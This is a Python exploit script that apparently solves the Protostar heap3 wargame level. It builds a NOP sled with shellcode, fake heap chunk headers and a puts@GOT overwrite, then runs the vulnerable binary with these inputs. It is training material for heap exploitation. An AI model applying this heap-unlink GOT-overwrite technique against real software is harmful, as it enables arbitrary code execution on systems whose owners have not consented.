import struct
import os
# frist argument
buf1 = b''
buf1 +=b"\x90"*8+"\xB8\x64\x88\x04\x08\xFF\xD0\xB8\xC0\x60\xEC\xB7\xFF\xD0" #shellcode
f=open('/tmp/1st','wb')
f.write(buf1)
f.close()
# second argument
buf2 = b''
buf2 += b'\x90'*4
buf2 += b'\xff'*(32-len(buf2)-4)
buf2 += b"\xdb\xc7\xb6\xa0" #size of "next fake chunk", end byte must be 1
# overwrite prev_size and size of the last chunk with -4
buf2 += struct.pack('I', 0xfffffffc)*2
f=open('/tmp/2nd','wb')
f.write(buf2)
f.close()
#third agrument
buf3 = b"\xff"*4 #junk
buf3 += b"\x1c\xb1\x04\x08" #put@GOT-12
buf3 += b"\x10\xc0\x04\x08" #addr of shellcode
f=open('/tmp/3rd','wb')
f.write(buf3)
f.close()
#exploit
os.system("/opt/protostar/bin/heap3 `cat /tmp/1st` `cat /tmp/2nd` `cat /tmp/3rd` ")